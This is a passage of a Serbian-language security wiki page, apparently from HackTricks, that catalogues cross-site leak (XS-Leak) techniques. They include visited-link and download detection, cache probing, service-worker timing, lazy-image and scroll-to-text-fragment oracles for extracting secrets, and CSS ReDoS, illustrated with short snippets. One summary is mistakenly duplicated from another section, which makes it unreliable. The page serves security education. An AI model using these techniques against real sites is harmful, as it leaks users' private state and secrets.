Uprkos ovim ograničenjima, moguće je indirektno razaznati posetjeno stanje linka. Jedna tehnika uključuje prevaru korisnika da interaguje sa područjem koje je pogođeno CSS-om, posebno koristeći `mix-blend-mode` svojstvo. Ovo svojstvo omogućava mešanje elemenata sa njihovom pozadinom, potencijalno otkrivajući posetjeno stanje na osnovu interakcije korisnika.

Štaviše, otkrivanje se može postići bez korisničke interakcije iskorišćavanjem vremena renderovanja linkova. Pošto pregledači mogu renderovati posetjene i neposetjene linkove drugačije, to može uvesti merljivu vremensku razliku u renderovanju. Dokaz koncepta (PoC) je pomenut u izveštaju o grešci u Chromium-u, demonstrirajući ovu tehniku koristeći više linkova kako bi pojačali vremensku razliku, čime se posetjeno stanje može otkriti analizom vremena.

Za više detalja o ovim svojstvima i metodama, posetite njihove stranice dokumentacije:

* `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** U Google Chrome-u, prikazuje se posvećena stranica greške kada je stranica blokirana za umetanje na stranici sa različitim poreklom zbog X-Frame-Options ograničenja.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa `X-Frame-Options` zaglavljem postavljenim na "deny" ili "same-origin" umetnuta kao objekat, pojavljuje se stranica greške. Chrome jedinstveno vraća prazan dokument objekat (umesto `null`) za `contentDocument` svojstvo ovog objekta, za razliku od iframe-ova ili drugih pregledača. Napadači bi mogli iskoristiti ovo otkrivanjem praznog dokumenta, potencijalno otkrivajući informacije o stanju korisnika, posebno ako programeri dosledno ne postavljaju X-Frame-Options zaglavlje, često zanemarujući stranice greške. Svest i dosledna primena bezbednosnih zaglavlja su ključni za sprečavanje ovakvih curenja.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Napadač može da razazna preuzimanje fajlova koristeći iframe; nastavak pristupa iframe-u implicira uspešno preuzimanje fajla.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` zaglavlje, posebno `Content-Disposition: attachment`, naređuje pregledaču da preuzme sadržaj umesto da ga prikaže inline. Ovo ponašanje se može iskoristiti za otkrivanje da li korisnik ima pristup stranici koja pokreće preuzimanje fajla. U Chromium-baziranim pregledačima, postoji nekoliko tehnika za otkrivanje ovog ponašanja preuzimanja:

1. **Praćenje trake za preuzimanje**:
* Kada se fajl preuzme u Chromium-baziranim pregledačima, traka za preuzimanje se pojavljuje na dnu prozora pregledača.
* Praćenjem promena u visini prozora, napadači mogu da zaključe da se traka za preuzimanje pojavila, što sugeriše da je preuzimanje pokrenuto.
2. **Navigacija preuzimanja sa iframe-ima**:
* Kada stranica pokrene preuzimanje fajla koristeći `Content-Disposition: attachment` zaglavlje, to ne izaziva događaj navigacije.
* Učitavanjem sadržaja u iframe i praćenjem događaja navigacije, moguće je proveriti da li sadržaj uzrokuje preuzimanje fajla (nema navigacije) ili ne.
3. **Navigacija preuzimanja bez iframe-a**:
* Slično tehnici iframe-a, ova metoda uključuje korišćenje `window.open` umesto iframe-a.
* Praćenje događaja navigacije u novootvorenom prozoru može otkriti da li je preuzimanje fajla pokrenuto (nema navigacije) ili se sadržaj prikazuje inline (navigacija se dešava).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zaključivanje o stanju autentifikacije korisnika na osnovu odgovora pregledača na zahtev za preuzimanje.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Napadač može da razazna preuzimanje fajlova koristeći iframe; nastavak pristupa iframe-u implicira uspešno preuzimanje fajla.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (iz [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Zato je ova tehnika zanimljiva: Chrome sada ima **particionisanje keša**, a ključ keša novootvorene stranice je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ali ako otvorim ngrok stranicu i koristim fetch u njoj, ključ keša će biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **ključ keša je različit**, tako da se keš ne može deliti. Više detalja možete pronaći ovde: [Sticanje bezbednosti i privatnosti deljenjem keša](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentar iz [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ako sajt `example.com` uključuje resurs sa `*.example.com/resource`, tada će taj resurs imati **isti ključ keša** kao da je resurs direktno **zatražen kroz navigaciju na vrhunskom nivou**. To je zato što se ključ keša sastoji od vrhunskog _eTLD+1_ i okvira _eTLD+1_.

Pošto je pristup kešu brži od učitavanja resursa, moguće je pokušati da promenite lokaciju stranice i otkažete je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon zaustavljanja, to znači da je resurs bio keširan.\
Ili možete jednostavno **poslati neki fetch na potencijalno keširanu stranicu i izmeriti vreme koje je potrebno**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Moguće je saznati da li je odgovor na fetch zahtev preusmeravanje
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Moguće je pokušati učitati resurs i prekinuti ga pre nego što se učita. U zavisnosti od toga da li je greška izazvana, resurs je bio ili nije bio keširan.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Koristite _**fetch**_ i _**setTimeout**_ sa **AbortController** da otkrijete da li je **resurs keširan** i da izbacite određeni resurs iz keša pregledača. Štaviše, proces se odvija bez keširanja novog sadržaja.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Moguće je **prepisati ugrađene funkcije** i pročitati njihove argumente čak i iz **cross-origin skripte** (koja se ne može direktno pročitati), što može **otkriti dragocene informacije**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Merenje vremena izvršenja web-a koristeći servisne radnike.
* **Code Example**:

U datom scenariju, napadač preuzima inicijativu da registruje **servisnog radnika** unutar jednog od svojih domena, konkretno "attacker.com". Zatim, napadač otvara novi prozor na ciljanom veb sajtu iz glavnog dokumenta i naređuje **servisnom radniku** da započne tajmer. Dok se novi prozor učitava, napadač navigira referencom dobijenom u prethodnom koraku na stranicu kojom upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa **204 (No Content)** status kodom, efikasno prekidajući proces navigacije. U tom trenutku, **servisni radnik** beleži merenje sa tajmera pokrenutog ranije u drugom koraku. Ovo merenje je pod uticajem trajanja JavaScript-a koje uzrokuje kašnjenja u procesu navigacije.

{% hint style="warning" %}
U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generalno zbog sadržaja stranice, status koda)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršavanje zahteva koristeći `window.open`. Mogu se koristiti i drugi satovi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane od strane **najnaprednijih** alata zajednice.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## With HTML or Re Injection

Ovde možete pronaći tehnike za eksfiltraciju informacija iz cross-origin HTML **ubacivanjem HTML sadržaja**. Ove tehnike su zanimljive u slučajevima kada iz bilo kog razloga možete **ubaciti HTML, ali ne možete ubaciti JS kod**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

Ako trebate **eksfiltrirati sadržaj** i možete **dodati HTML pre tajne**, trebali biste proveriti **uobičajene tehnike visećeg markup-a**.\
Međutim, ako iz bilo kog razloga **MORATE** to učiniti **karakter po karakter** (možda je komunikacija putem pogodka u kešu), možete koristiti ovu trik.

**Slike** u HTML-u imaju atribut "**loading**" čija vrednost može biti "**lazy**". U tom slučaju, slika će se učitati kada se pogleda, a ne dok se stranica učitava:
```html
<img src=/something loading=lazy >
```
Zato, ono što možete da uradite je da **dodate puno bespotrebnih karaktera** (Na primer **hiljade "W"**) da **popunite veb stranicu pre tajne ili dodate nešto poput** `<br><canvas height="1850px"></canvas><br>.`\
Tada, ako na primer naša **injekcija pojavi pre zastavice**, **slika** će biti **učitana**, ali ako se pojavi **posle** **zastavice**, zastavica + bespotrebni karakteri će **sprečiti da se učita** (biće potrebno da eksperimentišete sa tim koliko bespotrebnih karaktera da stavite). Ovo se desilo u [**ovoj analizi**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

Međutim, možete da **naterate bota da pristupi stranici** sa nečim poput
```
#:~:text=SECR
```
Dakle, veb stranica će biti nešto poput: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrži napadničke junk karaktere i sliku koja se učitava lenjo, a zatim se dodaje tajna bota.

Ovaj tekst će omogućiti botu da pristupi bilo kom tekstu na stranici koji sadrži tekst `SECR`. Pošto je taj tekst tajna i nalazi se **ispod slike**, **slika će se učitati samo ako je pogodjena tajna**. Tako imate svoj orakl za **ekstrakciju tajne karakter po karakter**.

Neki primer koda za iskorišćavanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Učitavanje slika na osnovu vremena

Ako **nije moguće učitati eksternu sliku** koja bi napadaču ukazala da je slika učitana, druga opcija bi bila da se pokuša **pogoditi karakter nekoliko puta i meriti to**. Ako se slika učita, svi zahtevi bi trajali duže nego ako se slika ne učita. Ovo je korišćeno u [**rešenju ovog izveštaja**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sažeto ovde:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, moguće je saznati putem vremena **da li neki HTML sadržaj postoji**, to je zato što ako selektor `main[id='site-main']` ne odgovara, ne mora da proverava ostatak **selektora**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defenses

Postoje preporučene mere zaštite na [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) kao i u svakoj sekciji wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo za više informacija o tome kako se zaštititi od ovih tehnika.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
